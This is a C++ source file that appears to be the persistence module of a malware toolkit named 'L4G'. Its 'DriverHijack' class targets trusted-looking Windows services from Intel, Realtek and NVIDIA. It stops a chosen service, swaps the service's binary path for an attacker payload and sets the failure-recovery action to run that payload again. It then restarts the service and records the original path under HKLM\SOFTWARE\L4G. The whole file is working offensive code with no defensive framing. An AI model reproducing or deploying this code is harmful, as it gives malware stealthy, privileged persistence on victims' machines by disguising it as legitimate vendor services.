#include "driver_hijack.hpp"
#include <windows.h>
#include <string>
#include <vector>
#include <filesystem>

namespace l4g::persistence {

const DriverHijack::HijackableService DriverHijack::HIJACKABLE_SERVICES[] = {
    {L"IntelHDAudioService", L"Intel(R) Audio Service", L"C:\\Windows\\System32\\IntelHDAudio.sys", true},
    {L"RtkAudioService", L"Realtek Audio Service", L"C:\\Windows\\System32\\RtkAudioService64.exe", false},
    {L"NVDisplay.Container", L"NVIDIA Display Container", L"C:\\Program Files\\NVIDIA Corporation\\Display.NvContainer\\NVDisplay.Container.exe", false},
    {L"AudioEndpointBuilder", L"Windows Audio Endpoint Builder", L"C:\\Windows\\System32\\AudioEndpointBuilder.dll", false},
    {L"IntelMEService", L"Intel Management Engine", L"C:\\Program Files\\Intel\\Intel(R) Management Engine Components\\DAL\\jhi_service.exe", false},
};
size_t DriverHijack::HIJACKABLE_COUNT = sizeof(HIJACKABLE_SERVICES) / sizeof(HijackableService);

DriverHijackResult DriverHijack::hijack_service(const std::wstring& target_service, const std::wstring& payload_path) {
    DriverHijackResult result;
    
    // Backup original config
    if (!backup_service_config(target_service)) {
        result.error = "Failed to backup service config";
        return result;
    }
    
    // Stop service
    SC_HANDLE scm = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
    if (!scm) { result.error = "OpenSCManager failed"; return result; }
    
    SC_HANDLE svc = OpenServiceW(scm, target_service.c_str(), SERVICE_STOP | SERVICE_CHANGE_CONFIG | SERVICE_QUERY_STATUS);
    if (!svc) { CloseServiceHandle(scm); result.error = "OpenService failed"; return result; }
    
    SERVICE_STATUS status = {};
    ControlService(svc, SERVICE_CONTROL_STOP, &status);
    Sleep(1000);
    
    // Change binary path
    if (!modify_service_binary(target_service, payload_path)) {
        result.error = "Failed to modify service binary";
        CloseServiceHandle(svc);
        CloseServiceHandle(scm);
        return result;
    }
    
    // Set recovery to run our payload on failure
    set_service_recovery(target_service, payload_path);
    
    // Start service
    bool ok = StartServiceW(svc, 0, nullptr);
    
    CloseServiceHandle(svc);
    CloseServiceHandle(scm);
    
    result.success = ok;
    return result;
}

bool DriverHijack::restore_service(const std::wstring& target_service) {
    // Restore from backup (stored in registry)
    HKEY hKey = nullptr;
    std::wstring backup_key = L"SOFTWARE\\L4G\\ServiceBackups\\" + target_service;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, backup_key.c_str(), 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
        return false;
    }
    
    wchar_t original_path[MAX_PATH];
    DWORD size = sizeof(original_path);
    if (RegQueryValueExW(hKey, L"OriginalPath", nullptr, nullptr, (LPBYTE)original_path, &size) != ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return false;
    }
    RegCloseKey(hKey);
    
    return modify_service_binary(target_service, original_path);
}

bool DriverHijack::is_hijacked(const std::wstring& target_service) {
    SC_HANDLE scm = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
    if (!scm) return false;
    
    SC_HANDLE svc = OpenServiceW(scm, target_service.c_str(), SERVICE_QUERY_CONFIG);
    if (!svc) { CloseServiceHandle(scm); return false; }
    
    DWORD needed = 0;
    QueryServiceConfigW(svc, nullptr, 0, &needed);
    std::vector<uint8_t> buffer(needed);
    LPQUERY_SERVICE_CONFIGW config = (LPQUERY_SERVICE_CONFIGW)buffer.data();
    
    bool hijacked = false;
    if (QueryServiceConfigW(svc, config, needed, &needed)) {
        std::wstring path(config->lpBinaryPathName);
        // Check if path is not the original
        for (size_t i = 0; i < HIJACKABLE_COUNT; ++i) {
            if (_wcsicmp(HIJACKABLE_SERVICES[i].service_name, target_service.c_str()) == 0) {
                if (_wcsicmp(path.c_str(), HIJACKABLE_SERVICES[i].binary_path) != 0) {
                    hijacked = true;
                }
                break;
            }
        }
    }
    
    CloseServiceHandle(svc);
    CloseServiceHandle(scm);
    return hijacked;
}

bool DriverHijack::backup_service_config(const std::wstring& service_name) {
    SC_HANDLE scm = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
    if (!scm) return false;
    
    SC_HANDLE svc = OpenServiceW(scm, service_name.c_str(), SERVICE_QUERY_CONFIG);
    if (!svc) { CloseServiceHandle(scm); return false; }
    
    DWORD needed = 0;
    QueryServiceConfigW(svc, nullptr, 0, &needed);
    std::vector<uint8_t> buffer(needed);
    LPQUERY_SERVICE_CONFIGW config = (LPQUERY_SERVICE_CONFIGW)buffer.data();
    
    bool ok = false;
    if (QueryServiceConfigW(svc, config, needed, &needed)) {
        // Store in registry
        HKEY hKey = nullptr;
        std::wstring backup_key = L"SOFTWARE\\L4G\\ServiceBackups\\" + service_name;
        if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, backup_key.c_str(), 0, nullptr, 0, KEY_WRITE, nullptr, &hKey, nullptr) == ERROR_SUCCESS) {
            ok = RegSetValueExW(hKey, L"OriginalPath", 0, REG_SZ, (BYTE*)config->lpBinaryPathName, (DWORD)((wcslen(config->lpBinaryPathName) + 1) * sizeof(wchar_t))) == ERROR_SUCCESS;
            RegCloseKey(hKey);
        }
    }
    
    CloseServiceHandle(svc);
    CloseServiceHandle(scm);
    return ok;
}

bool DriverHijack::modify_service_binary(const std::wstring& service_name, const std::wstring& new_binary) {
    SC_HANDLE scm = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
    if (!scm) return false;
    
    SC_HANDLE svc = OpenServiceW(scm, service_name.c_str(), SERVICE_CHANGE_CONFIG);
    bool ok = false;
    if (svc) {
        ok = ChangeServiceConfigW(svc, SERVICE_NO_CHANGE, SERVICE_NO_CHANGE, SERVICE_NO_CHANGE, new_binary.c_str(), nullptr, nullptr, nullptr, nullptr, nullptr, nullptr);
        CloseServiceHandle(svc);
    }
    CloseServiceHandle(scm);
    return ok;
}

bool DriverHijack::set_service_recovery(const std::wstring& service_name, const std::wstring& payload) {
    // Set service recovery to run our payload on failure
    SC_ACTION actions[3] = {
        {SC_ACTION_RUN_COMMAND, 0},
        {SC_ACTION_RUN_COMMAND, 0},
        {SC_ACTION_RUN_COMMAND, 0}
    };
    
    SERVICE_FAILURE_ACTIONSW failure = {0};
    failure.dwResetPeriod = 86400; // 24 hours
    failure.lpCommand = (LPWSTR)payload.c_str();
    failure.cActions = 3;
    failure.lpsaActions = actions;
    
    SC_HANDLE scm = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
    if (!scm) return false;
    
    SC_HANDLE svc = OpenServiceW(scm, service_name.c_str(), SERVICE_CHANGE_CONFIG);
    bool ok = false;
    if (svc) {
        ok = ChangeServiceConfig2W(svc, SERVICE_CONFIG_FAILURE_ACTIONS, &failure);
        CloseServiceHandle(svc);
    }
    CloseServiceHandle(scm);
    return ok;
}

} // namespace l4g::persistence